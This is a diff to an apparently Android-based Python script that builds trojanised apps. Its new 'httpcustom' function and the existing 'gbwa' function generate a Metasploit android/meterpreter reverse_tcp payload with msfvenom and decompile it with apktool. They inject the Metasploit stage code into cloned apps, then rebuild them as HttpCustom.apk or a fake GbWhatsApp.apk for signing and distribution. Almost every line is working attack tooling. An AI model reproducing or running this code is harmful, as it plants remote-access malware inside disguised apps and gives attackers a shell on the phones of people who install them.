@@ -99,6 +99,17 @@ def payload():
 	print hijau+'PLEASE WAIT 5 - 20 Minutes...' 
 	os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" -o Malware/payload.apk")
 	
+def httpcustom():
+	os.system("cd Malware && rm -rf payload.apk payload A")
+	os.system("git clone http://github.com/PyRAT-svg/HttpCustom &&mv -f HttpCustom Malware/A")
+	payload()
+	os.system("cd Malware && apktool d payload.apk -o payload")
+	os.system("rm -rf Malware/A/README.md  Malware/A/.git Malware/A/smali/xyz/metasploit/stage")
+	os.system("mv -f Malware/payload/smali/com/metasploit/stage Malware/A/smali/xyz/metasploit/")
+	os.system("cd Malware && apktool b A -o HttpCustom.apk")
+	os.system("cd Malware && rm -rf payload.apk payload A")
+	os.system('mv -f Malware/HttpCustom.apk /storage/emulated/0/')
+	os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
 
 def gbwa():
 	os.system("cd Malware && rm -rf payload.apk payload A")
@@ -106,7 +117,7 @@ def gbwa():
 	payload()
 	os.system("cd Malware && apktool d payload.apk -o payload")
 	os.system("rm -rf Malware/A/README.md  Malware/A/.git Malware/A/smali/com/metasploit/stage")
-	os.system("mv -f Malware/payload/smali/com/metasploit/stage Malware/A/smali/com/metasploit")
+	os.system("mv -f Malware/payload/smali/com/metasploit/stage Malware/A/smali/com/metasploit/")
 	os.system("cd Malware && apktool b A -o GbWhatsApp.apk")
 	os.system("cd Malware && rm -rf payload.apk payload A")
 	os.system('mv -f Malware/GbWhatsApp.apk /storage/emulated/0/')
@@ -374,4 +385,3 @@ def home():
         
 
 home()
-    
